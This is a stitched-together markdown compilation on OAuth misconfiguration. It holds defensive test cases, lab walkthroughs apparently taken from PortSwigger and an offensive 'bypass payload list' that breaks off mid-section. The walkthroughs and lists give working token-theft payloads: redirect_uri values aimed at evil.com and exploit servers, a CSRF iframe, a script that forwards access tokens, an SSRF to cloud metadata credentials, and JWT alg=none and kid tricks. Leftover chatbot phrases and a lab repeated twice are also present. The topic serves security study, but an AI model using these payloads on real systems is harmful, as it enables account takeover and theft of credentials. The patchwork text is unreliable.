# OAuth Misconfiguration

> OAuth is a widely-used authorization framework that allows third-party applications to access user data without exposing user credentials. However, improper configuration and implementation of OAuth can lead to severe security vulnerabilities. This document explores common OAuth misconfigurations, potential attack vectors, and best practices for mitigating these risks.
> 
## Summary

- [Stealing OAuth Token via referer](#stealing-oauth-token-via-referer)
- [Grabbing OAuth Token via redirect_uri](#grabbing-oauth-token-via-redirect---uri)
- [Executing XSS via redirect_uri](#executing-xss-via-redirect---uri)
- [OAuth Private Key Disclosure](#oauth-private-key-disclosure)
- [Authorization Code Rule Violation](#authorization-code-rule-violation)
- [Cross-Site Request Forgery](#cross-site-request-forgery)
- [Labs](#labs)
- [References](#references)

Understood.
Below is the **FULL SET of ALL OAuth Mandatory Vulnerabilities**, each written in the **exact same format** you approved:

* Vulnerability Name
* Test Case Expectation
* Test Case Payload(s) (SAFE, NON‑EXPLOITABLE, PLACEHOLDER VALUES)
* Expected Result

Everything is formatted consistently.

---
Here is the **GitHub‑friendly Markdown format** you requested.
Everything is cleaned, aligned, and rendered properly for README.md usage.

---

# ✅ **OAuth Mandatory Vulnerability Names**

* **Misconfigured Redirect URI**
* **Missing PKCE (Proof Key for Code Exchange)**
* **Weak or Missing State Parameter**
* **Lack of HTTPS Enforcement**
* **Invalid Token Claim Validation**
* **Implicit Flow Enabled (response_type=token)**
* **Insecure Token Storage (Client-Side)**
* **Authorization Code Reuse**
* **Missing Client Authentication (Confidential Clients)**
* **Missing Nonce Validation (OIDC)**
* **JWKS Key Rotation Failure**
* **ROPC (Resource Owner Password Credentials) Enabled**

---
# **1. Misconfigured Redirect URI**

## ✔ Test Case Expectation

Server must reject any redirect URI that is **not exactly registered**.

### 📌 Test Case Payload (INVALID ON PURPOSE)

```http
GET /authorize?
  client_id=testapp&
  response_type=code&
  redirect_uri=https://example.com/callback-test&
  scope=openid&
  state=test_state_001
```

### **Expected Result:**

❌ Rejected because `callback-test` is not an exact-match.

---

# **2. Missing PKCE (Public Clients)**

## ✔ Test Case Expectation

If PKCE is missing → reject.

### 📌 Payload (Missing PKCE)

```http
GET /authorize?
  response_type=code&
  client_id=public-app-01&
  redirect_uri=com.app://cb&
  scope=openid profile
```

### **Expected Result:**

❌ Reject with “missing code_challenge”.

---

### 📌 Payload (With PKCE)

```http
GET /authorize?
  response_type=code&
  client_id=public-app-01&
  redirect_uri=com.app://cb&
  scope=openid profile&
  state=pkce_tc_01&
  code_challenge=TESTCHALLENGE123456&
  code_challenge_method=S256
```

### **Expected Result:**

✔ Accepted.

---

# **3. Weak or Missing State Parameter**

## ✔ Test Case Expectation

`state` must be validated to prevent CSRF.

### 📌 Payload (Missing State)

```http
GET /authorize?
  client_id=testapp&
  response_type=code&
  redirect_uri=https://example.com/callback&
  scope=openid
```

### **Expected Result:**

❌ Reject because `state` is missing.

---

# **4. Lack of HTTPS Enforcement**

## ✔ Test Case Expectation

OAuth endpoints must use HTTPS.

### 📌 Payload (HTTP instead of HTTPS)

```http
GET http://auth.example.com/authorize?client_id=testapp
```

### **Expected Result:**

❌ Reject or redirect to HTTPS.

---

# **5. Invalid Token Claim Validation**

## ✔ Test Case Expectation

Tokens must be rejected if `iss`, `aud`, `exp`, or signature is invalid.

### 📌 Test Case Payload (Expired Token Example)

```json
{
  "iss": "https://auth.example.com/",
  "aud": "https://api.example.com/",
  "sub": "user001",
  "exp": 1000000000
}
```

### **Expected Result:**

❌ Reject due to expired token.

---

# **6. Implicit Flow Enabled (response_type=token)**

## ✔ Test Case Expectation

Implicit flow must be disabled.

### 📌 Payload (Implicit Flow)

```http
GET /authorize?
  response_type=token&
  client_id=testclient&
  redirect_uri=https://example.com/callback&
  scope=openid
```

### **Expected Result:**

❌ Reject because implicit flow is disabled.

---

# **7. Insecure Token Storage (Client-Side)**

## ✔ Test Case Expectation

Tokens must be stored in secure cookies or secure mobile storage.

### 📌 Payload (Correct Secure Cookie)

```http
Set-Cookie: access_token=TEST123;
  HttpOnly;
  Secure;
  SameSite=Lax;
```

### **Expected Result:**

✔ Accepted — secure cookie attributes present.

---

# **8. Authorization Code Reuse**

## ✔ Test Case Expectation

Authorization codes must be single-use only.

### 📌 First Use (Valid)

```http
POST /token
grant_type=authorization_code&
code=TEST_CODE_01&
redirect_uri=https://example.com/callback&
client_id=testapp
```

### **Expected Result:**

✔ Accepted.

---

### 📌 Second Use (Reuse Attempt)

```http
POST /token
code=TEST_CODE_01
```

### **Expected Result:**

❌ Reject — authorization code already used.

---

# **9. Missing Client Authentication (Confidential Clients)**

## ✔ Test Case Expectation

Confidential clients must authenticate at the token endpoint.

### 📌 Invalid Secret

```http
POST /token
client_id=server-client-01&
client_secret=WRONG_SECRET
```

### **Expected Result:**

❌ Reject — invalid client authentication.

---

### 📌 Valid Secret

```http
POST /token
client_id=server-client-01&
client_secret=VALID_SECRET_001
```

### **Expected Result:**

✔ Accepted.

---

# **10. Missing Nonce Validation (OIDC)**

## ✔ Test Case Expectation

OIDC authorization must include and validate a `nonce`.

### 📌 Missing Nonce

```http
GET /authorize?
  client_id=oidc-client&
  response_type=code&
  redirect_uri=https://example.com/callback&
  scope=openid profile
```

### **Expected Result:**

❌ Reject — missing required nonce.

---

### 📌 Valid Nonce

```http
nonce=OIDC_NONCE_TEST_01
```

### **Expected Result:**

✔ Nonce accepted.

---

# **11. JWKS Key Rotation Failure**

## ✔ Test Case Expectation

Tokens must be rejected when signed with unknown or outdated keys.

### 📌 JWKS (Dummy Example)

```json
{
  "keys": [
    {
      "kid": "testkey001",
      "kty": "RSA",
      "alg": "RS256",
      "n": "00TESTMODULUS",
      "e": "AQAB"
    }
  ]
}
```

### **Expected Result:**

❌ Reject if the token references a key ID not found in JWKS.

---

# **12. ROPC (Resource Owner Password Credentials) Enabled**

## ✔ Test Case Expectation

ROPC must be disabled.

### 📌 Payload (ROPC Flow)

```http
POST /token
grant_type=password&
username=testuser&
password=password123
```

### **Expected Result:**

❌ Reject — ROPC flow is forbidden.

---


## Stealing OAuth Token via referer

> Do you have HTML injection but can't get XSS? Are there any OAuth implementations on the site? If so, setup an img tag to your server and see if there's a way to get the victim there (redirect, etc.) after login to steal OAuth tokens via referer - [@abugzlife1](https://twitter.com/abugzlife1/status/1125663944272748544)


## Grabbing OAuth Token via redirect_uri

Redirect to a controlled domain to get the access token

```powershell
https://www.example.com/signin/authorize?[...]&redirect_uri=https://demo.example.com/loginsuccessful
https://www.example.com/signin/authorize?[...]&redirect_uri=https://localhost.evil.com
```

Redirect to an accepted Open URL in to get the access token

```powershell
https://www.example.com/oauth20_authorize.srf?[...]&redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com
https://www.example.com/oauth2/authorize?[...]&redirect_uri=https%3A%2F%2Fapps.facebook.com%2Fattacker%2F
```

OAuth implementations should never whitelist entire domains, only a few URLs so that “redirect_uri” can’t be pointed to an Open Redirect.

Sometimes you need to change the scope to an invalid one to bypass a filter on redirect_uri:

```powershell
https://www.example.com/admin/oauth/authorize?[...]&scope=a&redirect_uri=https://evil.com
```


## Executing XSS via redirect_uri

```powershell
https://example.com/oauth/v1/authorize?[...]&redirect_uri=data%3Atext%2Fhtml%2Ca&state=<script>alert('XSS')</script>
```


## OAuth Private Key Disclosure

Some Android/iOS app can be decompiled and the OAuth Private key can be accessed.


## Authorization Code Rule Violation

> The client MUST NOT use the authorization code  more than once.  

If an authorization code is used more than once, the authorization server MUST deny the request 
and SHOULD revoke (when possible) all tokens previously issued based on that authorization code.


## Cross-Site Request Forgery

Applications that do not check for a valid CSRF token in the OAuth callback are vulnerable. This can be exploited by initializing the OAuth flow and intercepting the callback (`https://example.com/callback?code=AUTHORIZATION_CODE`). This URL can be used in CSRF attacks.

> The client MUST implement CSRF protection for its redirection URI. This is typically accomplished by requiring any request sent to the redirection URI endpoint to include a value that binds the request to the user-agent's authenticated state. The client SHOULD utilize the "state" request parameter to deliver this value to the authorization server when making an authorization request.


**OAuth Exploitation:-**

-   Stealing OAuth Token via Referer

-   Grabbing OAuth Token via redirect_uri

-   Executing XSS via redirect_uri

-   OAuth Private Key Disclosure

-   Authorization Code Rule Violation

-   Cross-Site Request Forgery (CSRF)

Reference: PayloadsAllTheThings - OAuth

Authentication bypass via OAuth implicit flow
=============================================

This lab uses an OAuth service to allow users to log in with their social media
account. Flawed validation by the client application makes it possible for an
attacker to log in to other users' accounts without knowing their password.

To solve the lab, log in to Carlos's account. His email address is
carlos\@carlos-montoya.net.

You can log in with your own social media account using the following
credentials: wiener:peter.

References:

-   https://portswigger.net/web-security/oauth

![img](media/239ff709b8f18768f3165e987d59fae8.png)

After clicking to log in, there is a GET request:

![img](media/7f524f9ca5ddffa06d7e8d333606e6eb.png)

Then there is a form to authenticate:

![img](media/ec55461342a7c56199b37b288e7e6693.png)

And then authorize the application to access some information:

![img](media/db53347b86cd1983724aadbd952995d9.png)

One of the last requests is a POST request to “/authenticate” with the
information of the user:

![img](media/163fb75f2f2e1f05065b65f36056bee0.png)

I will change it to the information of the user “carlos”:

![img](media/b2ac2c4a2bacc011fd24af5af585d512.png)

With this we get authenticated as carlos:

![img](media/d539200371544e13f5da10e0102dd87f.png)

Forced OAuth profile linking
============================

This lab gives you the option to attach a social media profile to your account
so that you can log in via OAuth instead of using the normal username and
password. Due to the insecure implementation of the OAuth flow by the client
application, an attacker can manipulate this functionality to obtain access to
other users' accounts.

To solve the lab, use a CSRF attack to attach your own social media profile to
the admin user's account on the blog website, then access the admin panel and
delete Carlos.

The admin user will open anything you send from the exploit server and they
always have an active session on the blog website.

You can log in to your own accounts using the following credentials:

-   Blog website account: wiener:peter

-   Social media profile: peter.wiener:hotdog

References:

-   https://portswigger.net/web-security/oauth

![img](media/5763c348158918a6795e158004b1afd3.png)

Once authenticated, there is an options to attach a social profile:

![img](media/47869cad1e9e6d51dbc0098eec4eeb49.png)

It redirects to:

![img](media/5ee2f3947e23496c6034b6bf284a43bc.png)

And then:

![img](media/a58169fcc35cfc65cf49e26fb0ef33b1.png)

The last request is a GET request to “/oauth-linking” with a code:

![img](media/a5dbbeac1b61d9c2dcc19c2ff17f8384.png)

Create an iframe for the victim to access this link:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
<iframe src="https://0a0200d703e9d1e08553857b002e00df.web-security-academy.net/oauth-linking?code=jETtPOj5DHmBoJt_E3Po0I2PQEndgDoRhuFexNBuDpt"></iframe>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/7564d7d968ece91ea0623bde8f3c1b2b.png)

Then click “Log in with social media” and you will log in as the administrator:

![img](media/f8400aa7d71e5f966b5367f9a2853d9b.png)


## OAuth account hijacking via redirect_uri

This lab uses an OAuth service to allow users to log in with their social media account. A misconfiguration by the OAuth provider makes it possible for an attacker to steal authorization codes associated with other users' accounts.

To solve the lab, steal an authorization code associated with the admin user, then use it to access their account and delete Carlos.

The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

You can log in with your own social media account using the following credentials: wiener:peter.

https://portswigger.net/web-security/oauth

---------------------------------------------

References: 

- https://portswigger.net/web-security/oauth

![img](images/OAuth%20account%20hijacking%20via%20redirect_uri/1.png)
![img](images/OAuth%20account%20hijacking%20via%20redirect_uri/2.png)

---------------------------------------------

https://0a0c001204d355fec1a39983009b007d.web-security-academy.net/

![img](images/OAuth%20account%20hijacking%20via%20redirect_uri/3.png)

![img](images/OAuth%20account%20hijacking%20via%20redirect_uri/4.png)


https://oauth-0a5f00ff04d45537c1f997b8025a00a0.oauth-server.net/auth?client_id=wkw7zy0gcxh46yxashxrk&redirect_uri=https://0a0c001204d355fec1a39983009b007d.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email


https://oauth-0a5f00ff04d45537c1f997b8025a00a0.oauth-server.net/auth?client_id=wkw7zy0gcxh46yxashxrk&redirect_uri=https://exploit-0a4c00770488559fc1e198fb01180071.exploit-server.net&response_type=code&scope=openid%20profile%20email

![img](images/OAuth%20account%20hijacking%20via%20redirect_uri/5.png)
![img](images/OAuth%20account%20hijacking%20via%20redirect_uri/6.png)

Follow redirection:

![img](images/OAuth%20account%20hijacking%20via%20redirect_uri/7.png)

Access logs:

![img](images/OAuth%20account%20hijacking%20via%20redirect_uri/8.png)

Payload to open the link:
<body onload="window.open('https://oauth-0a5f00ff04d45537c1f997b8025a00a0.oauth-server.net/auth?client_id=wkw7zy0gcxh46yxashxrk&redirect_uri=https://exploit-0a4c00770488559fc1e198fb01180071.exploit-server.net/&response_type=code&scope=openid%20profile%20email')">

![img](images/OAuth%20account%20hijacking%20via%20redirect_uri/9.png)

Deliver exploit to victim:

![img](images/OAuth%20account%20hijacking%20via%20redirect_uri/10.png)

Log out, log in and replace the code with this one:

![img](images/OAuth%20account%20hijacking%20via%20redirect_uri/11.png)

After the last request, you get admin access:

![img](images/OAuth%20account%20hijacking%20via%20redirect_uri/12.png)

Admin panel:

![img](images/OAuth%20account%20hijacking%20via%20redirect_uri/14.png)
![img](images/OAuth%20account%20hijacking%20via%20redirect_uri/15.png)


# Stealing OAuth access tokens via an open redirect

This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.

To solve the lab, identify an open redirect on the blog website and use this to steal an access token for the admin user's account. Use the access token to obtain the admin's API key and submit the solution using the button provided in the lab banner.

Note: You cannot access the admin's API key by simply logging in to their account on the client application.

The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

You can log in via your own social media account using the following credentials: wiener:peter.


---------------------------------------------

References: 

- https://portswigger.net/web-security/oauth





![img](images/Stealing%20OAuth%20access%20tokens%20via%20an%20open%20redirect/1.png)
![img](images/Stealing%20OAuth%20access%20tokens%20via%20an%20open%20redirect/2.png)

---------------------------------------------

If we change the “redirect_uri” parameter to the url of the exploit server we find it is not possible as it is not part of the registered values:



![img](images/Stealing%20OAuth%20access%20tokens%20via%20an%20open%20redirect/3.png)


And we can not provide the parameter twice, so no parameter pollution:



![img](images/Stealing%20OAuth%20access%20tokens%20via%20an%20open%20redirect/4.png)



Starting with “localhost” does not work either:



![img](images/Stealing%20OAuth%20access%20tokens%20via%20an%20open%20redirect/5.png)


But it is possible to add “../” to the url:



![img](images/Stealing%20OAuth%20access%20tokens%20via%20an%20open%20redirect/6.png)


Blogs have a “Next post” button which seems vulnerable to open redirect:



![img](images/Stealing%20OAuth%20access%20tokens%20via%20an%20open%20redirect/7.png)


We can change the “path” parameter to anyone we need:



![img](images/Stealing%20OAuth%20access%20tokens%20via%20an%20open%20redirect/8.png)


We can use it to redirect to the exploit server:

```
GET /post/next?path=https://exploit-0ac500c0030538a5812f33c001d60054.exploit-server.net/
```



![img](images/Stealing%20OAuth%20access%20tokens%20via%20an%20open%20redirect/9.png)


We can set the “redirect_uri” to “/post/next”:

```
redirect_uri=https://0a5100fc036a387b81e8347900740079.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0ac500c0030538a5812f33c001d60054.exploit-server.net/
```

```
GET /auth?client_id=oy2ed6shddhvjw8klmsnu&redirect_uri=redirect_uri=https://0a5100fc036a387b81e8347900740079.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0ac500c0030538a5812f33c001d60054.exploit-server.net/&response_type=token&nonce=1218229424&scope=openid%20profile%20email HTTP/2
``` 



![img](images/Stealing%20OAuth%20access%20tokens%20via%20an%20open%20redirect/10.png)


The previous payload redirects to the exploit server:



![img](images/Stealing%20OAuth%20access%20tokens%20via%20an%20open%20redirect/11.png)


And it contains the access token in the url:



![img](images/Stealing%20OAuth%20access%20tokens%20via%20an%20open%20redirect/12.png)


The value is not logged because it starts with “#”. 

From the solution I found a way to log the second part after “#”:

```
<script>
window.location = '/?'+document.location.hash.substr(1)
</script>
```


We can set the “redirect_uri” to redirect to “/exploit” in the exploit server:

```
redirect_uri=https://0a5100fc036a387b81e8347900740079.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0ac500c0030538a5812f33c001d60054.exploit-server.net/exploit
```

```
GET /auth?client_id=oy2ed6shddhvjw8klmsnu&redirect_uri=https://0a5100fc036a387b81e8347900740079.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0ac500c0030538a5812f33c001d60054.exploit-server.net/exploit&response_type=token&nonce=328741005&scope=openid%20profile%20email HTTP/2
``` 

We reach /exploit:



![img](images/Stealing%20OAuth%20access%20tokens%20via%20an%20open%20redirect/13.png)


And it causes a second redirection:



![img](images/Stealing%20OAuth%20access%20tokens%20via%20an%20open%20redirect/14.png)


Now the access token is logged:



![img](images/Stealing%20OAuth%20access%20tokens%20via%20an%20open%20redirect/15.png)



Now we will prepare the “/exploit” path so it redirects to “/auth” first and to the exploit server second:

```
<script>
    if (!document.location.hash) {
        window.location = 'https://oauth-0a6500a0036c389681a332430272000a.oauth-server.net/auth?client_id=oy2ed6shddhvjw8klmsnu&redirect_uri=https://0a5100fc036a387b81e8347900740079.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0ac500c0030538a5812f33c001d60054.exploit-server.net/exploit/&response_type=token&nonce=-1318932807&scope=openid%20profile%20email'
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>
```


We get an access token from the victim:



![img](images/Stealing%20OAuth%20access%20tokens%20via%20an%20open%20redirect/16.png)


Finally we can use this token to list the user information in “/me”:

```
GET /me HTTP/2
Host: oauth-0a6500a0036c389681a332430272000a.oauth-server.net
...
Authorization: Bearer z-YNsRxiSi76jANt3-GzRzwq65ru3uOA8K3z0w1urIm
```



![img](images/Stealing%20OAuth%20access%20tokens%20via%20an%20open%20redirect/17.png)

SSRF via OpenID dynamic client registration
===========================================

This lab allows client applications to dynamically register themselves with the
OAuth service via a dedicated registration endpoint. Some client-specific data
is used in an unsafe way by the OAuth service, which exposes a potential vector
for SSRF.

To solve the lab, craft an SSRF attack to access
http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/ and
steal the secret access key for the OAuth provider's cloud environment.

You can log in to your own account using the following credentials: wiener:peter

Note: To prevent the Academy platform being used to attack third parties, our
firewall blocks interactions between the labs and arbitrary external systems. To
solve the lab, you must use Burp Collaborator's default public server.

References:

-   https://portswigger.net/web-security/oauth/openid

![img](media/32ac6624cca37c3e06d6378c677c68b3.png)

We can read the configuration file in the path /.well-known/openid-configuration
of the Oauth domain:

![img](media/d2068560dd3dfbe59adf7333ddc6e956.png)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
{"authorization_endpoint":"https://oauth-0a76003403dd792f81c9abe702320017.oauth-server.net/auth",
"claims_parameter_supported":false,"claims_supported":["sub","name","email","email_verified","sid","auth_time","iss"],"code_challenge_methods_supported":["S256"],"end_session_endpoint":"https://oauth-0a76003403dd792f81c9abe702320017.oauth-server.net/session/end","grant_types_supported":["authorization_code","refresh_token"],"id_token_signing_alg_values_supported":["HS256","ES256","EdDSA","PS256","RS256"],"issuer":"https://oauth-0a76003403dd792f81c9abe702320017.oauth-server.net","jwks_uri":"https://oauth-0a76003403dd792f81c9abe702320017.oauth-server.net/jwks","registration_endpoint":"https://oauth-0a76003403dd792f81c9abe702320017.oauth-server.net/reg","response_modes_supported":["form_post","fragment","query"],"response_types_supported":["code"],"scopes_supported":["openid","offline_access","profile","email"],"subject_types_supported":["public"],"token_endpoint_auth_methods_supported":["none","client_secret_basic","client_secret_jwt","client_secret_post","private_key_jwt"],"token_endpoint_auth_signing_alg_values_supported":["HS256","RS256","PS256","ES256","EdDSA"],"token_endpoint":"https://oauth-0a76003403dd792f81c9abe702320017.oauth-server.net/token","request_object_signing_alg_values_supported":["HS256","RS256","PS256","ES256","EdDSA"],"request_parameter_supported":false,"request_uri_parameter_supported":true,"require_request_uri_registration":true,"userinfo_endpoint":"https://oauth-0a76003403dd792f81c9abe702320017.oauth-server.net/me","userinfo_signing_alg_values_supported":["HS256","ES256","EdDSA","PS256","RS256"],"introspection_endpoint":"https://oauth-0a76003403dd792f81c9abe702320017.oauth-server.net/token/introspection","introspection_endpoint_auth_methods_supported":["none","client_secret_basic","client_secret_jwt","client_secret_post","private_key_jwt"],"introspection_endpoint_auth_signing_alg_values_supported":["HS256","RS256","PS256","ES256","EdDSA"],"revocation_endpoint":"https://oauth-0a76003403dd792f81c9abe702320017.oauth-server.net/token/revocation","revocation_endpoint_auth_methods_supported":["none","client_secret_basic","client_secret_jwt","client_secret_post","private_key_jwt"],"revocation_endpoint_auth_signing_alg_values_supported":["HS256","RS256","PS256","ES256","EdDSA"],"claim_types_supported":["normal"]}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The registration endpoint is
https://oauth-0a76003403dd792f81c9abe702320017.oauth-server.net/reg. We can
register using a POST request like this:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
POST https://oauth-0a76003403dd792f81c9abe702320017.oauth-server.net/reg HTTP/2
Host: oauth-0a76003403dd792f81c9abe702320017.oauth-server.net
...

{
    "application_type": "web",
    "redirect_uris": [
        "https://client-app.com/callback",
        "https://client-app.com/callback2"
        ],
    "client_name": "My Application",
    "logo_uri": "https://client-app.com/logo.png",
    "token_endpoint_auth_method": "client_secret_basic",
    "jwks_uri": "https://client-app.com/my_public_keys.jwks",
    "userinfo_encrypted_response_alg": "RSA1_5",
    "userinfo_encrypted_response_enc": "A128CBC-HS256"
}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/992aa9100652949edaa5f150a2f29f83.png)

We can retrieve the information with a GET request using the client uri and the
access token:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
GET https://oauth-0a76003403dd792f81c9abe702320017.oauth-server.net/reg/2KNEf4dJKOmBdXye_KEhK?access_token=6G8_0Ow8SO_MDIBo4h8J23k9WsLmZCjY9AiWEM0j26v
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/324c6cb7386e592b29de63916fd1c15c.png)

We can set the URIs to the one we want to obtain:

![img](media/00b323c67afd5c480c7fa784bb61ad60.png)

During the login process there was a request to get the application logo:

![img](media/4753bb7010afc9f9f422c0ad21bd781d.png)

We can change the client_id for the one of the new application:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
GET /client/m7xK68ZFDecUNKJ6U91xk/logo
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/7f298a4bf9bd925e67dfedfbf46c7e7a.png)

## Labs

* [PortSwigger - Authentication bypass via OAuth implicit flow](https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow)
* [PortSwigger - Forced OAuth profile linking](https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking)
* [PortSwigger - OAuth account hijacking via redirect_uri](https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri)
* [PortSwigger - Stealing OAuth access tokens via a proxy page](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page)
* [PortSwigger - Stealing OAuth access tokens via an open redirect](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect)


## References

- [All your Paypal OAuth tokens belong to me - asanso - November 28, 2016](http://blog.intothesymmetry.com/2016/11/all-your-paypal-tokens-belong-to-me.html) 
- [OAuth 2 - How I have hacked Facebook again (..and would have stolen a valid access token) - asanso - April 8, 2014](http://intothesymmetry.blogspot.ch/2014/04/oauth-2-how-i-have-hacked-facebook.html)
- [How I hacked Github again - Egor Homakov - February 7, 2014](http://homakov.blogspot.ch/2014/02/how-i-hacked-github-again.html)
- [How Microsoft is giving your data to Facebook… and everyone else - Andris Atteka - September 16, 2014](http://andrisatteka.blogspot.ch/2014/09/how-microsoft-is-giving-your-data-to.html)
- [Bypassing Google Authentication on Periscope's Administration Panel - Jack Whitton - July 20, 2015](https://whitton.io/articles/bypassing-google-authentication-on-periscopes-admin-panel/)

# 2 - OAuth account hijacking via redirect_uri

This lab uses an OAuth service to allow users to log in with their social media account. A misconfiguration by the OAuth provider makes it possible for an attacker to steal authorization codes associated with other users' accounts.

To solve the lab, steal an authorization code associated with the admin user, then use it to access their account and delete Carlos.

The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

You can log in with your own social media account using the following credentials: wiener:peter.

------------------------------------------------

![](images/2%20-%20OAuth%20account%20hijacking%20via%20redirect_uri/1.png)

Reference: https://portswigger.net/web-security/oauth

![](images/2%20-%20OAuth%20account%20hijacking%20via%20redirect_uri/2.png)

------------------------------------------------

Generated endpoint: https://0a0c001204d355fec1a39983009b007d.web-security-academy.net/

![](images/2%20-%20OAuth%20account%20hijacking%20via%20redirect_uri/3.png)

![](images/2%20-%20OAuth%20account%20hijacking%20via%20redirect_uri/4.png)

https://oauth-0a5f00ff04d45537c1f997b8025a00a0.oauth-server.net/auth?client_id=wkw7zy0gcxh46yxashxrk&redirect_uri=https://0a0c001204d355fec1a39983009b007d.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email


https://oauth-0a5f00ff04d45537c1f997b8025a00a0.oauth-server.net/auth?client_id=wkw7zy0gcxh46yxashxrk&redirect_uri=https://exploit-0a4c00770488559fc1e198fb01180071.exploit-server.net&response_type=code&scope=openid%20profile%20email

![](images/2%20-%20OAuth%20account%20hijacking%20via%20redirect_uri/5.png)

![](images/2%20-%20OAuth%20account%20hijacking%20via%20redirect_uri/6.png)

Follow redirection:

![](images/2%20-%20OAuth%20account%20hijacking%20via%20redirect_uri/7.png)

Access logs:

![](images/2%20-%20OAuth%20account%20hijacking%20via%20redirect_uri/8.png)

Payload to open the link:
<body onload="window.open('https://oauth-0a5f00ff04d45537c1f997b8025a00a0.oauth-server.net/auth?client_id=wkw7zy0gcxh46yxashxrk&redirect_uri=https://exploit-0a4c00770488559fc1e198fb01180071.exploit-server.net/&response_type=code&scope=openid%20profile%20email')">

![](images/2%20-%20OAuth%20account%20hijacking%20via%20redirect_uri/9.png)


Deliver exploit to victim:

![](images/2%20-%20OAuth%20account%20hijacking%20via%20redirect_uri/10.png)
  
Log out, log in and replace the code with this one:

![](images/2%20-%20OAuth%20account%20hijacking%20via%20redirect_uri/11.png)

After the last request, you get admin access:

![](images/2%20-%20OAuth%20account%20hijacking%20via%20redirect_uri/12.png)

Admin panel:

![](images/2%20-%20OAuth%20account%20hijacking%20via%20redirect_uri/14.png)
  
![](images/2%20-%20OAuth%20account%20hijacking%20via%20redirect_uri/15.png)

Below is the **OAuth Misconfiguration – Complete Bypass Payload List**, in the **same table-style format** as your previous (SSTI / Command Injection / Directory Traversal / Insecure Deserialization etc.).
All payloads are offensive-security testing payloads used for **OAuth abuse, account takeover, redirect hijacking, token forgery, scope escalation, PKCE bypass, OpenID issues**, etc.

---

# ⭐ **OAuth Misconfiguration – Complete Bypass Payload List**

---

# **1. OAuth Redirect URI Manipulation**

### **Open Redirect Payloads**

```
https://auth.com/oauth?redirect_uri=https://evil.com
https://auth.com/oauth?redirect_uri=https://trusted.com.evil.com
https://auth.com/oauth?redirect_uri=https://trusted.com%2F%2Fevil.com
```

### **Double Encoding**

```
redirect_uri=https%253A%252F%252Fevil.com
```

### **Fragment Injection**

```
redirect_uri=https://trusted.com/#https://evil.com
```

### **DNS Rebinding**

```
redirect_uri=https://attacker.burpcollab.net
```

---

# **2. OAuth `state` Parameter Bypass**

### **Missing / Empty State**

```
&state=
```

### **Predictable State**

```
&state=123
```

### **Replay/Reuse of State**

```
Use previously captured state to force login on victim.
```

### **State Injection**

```
&state=xyz&redirect_uri=https://evil.com
```

---

# **3. Authorization Code Interception**

### **Code Leaking via Redirect**

```
https://victim.com/callback?code=abc123
```

### **Code Reuse**

```
Reuse intercepted auth code before legitimate user redeems it.
```

### **Code-in-URL via Open Redirect**

```
https://auth.com/authorize?redirect_uri=https://evil.com/path?code=<steal>
```

---

# **4. PKCE Bypass Payloads**

### **Plain PKCE (no challenge)**

```
code_challenge_method=plain
code_challenge=123
```

### **Predictable code_verifier**

```
code_verifier=111111111111111111111111111111111111
```

### **Weak PKCE (same challenge/verifier)**

```
code_challenge=abc
code_verifier=abc
```

---

# **5. Scope Escalation Payloads**

### **Add Admin Scopes**

```
scope=openid%20email%20profile%20admin
```

### **Full Privilege Escalation**

```
scope=read write delete sudo
```

### **Wildcard Scope Abuse**

```
scope=*
```

---

# **6. Token Substitution / Manipulation**

### **Replacing access_token**

```
access_token=ATTACKER_ACCESS_TOKEN
```

### **Use of Bearer Token in Header**

```
Authorization: Bearer <stolen-token>
```

### **Injecting ID Token**

```
id_token=<attacker-JWT>
```

---

# **7. JWT Manipulation (ID Token Abuse)**

### **alg=none bypass**

```
{"alg":"none"}
```

### **Kid Header Injection**

```
{"kid":"../../../../../../dev/null"}
```

### **Algorithm Confusion Attack**

```
Change RS256 → HS256 and sign with public key
```

### **JWT Claim Injection**

```
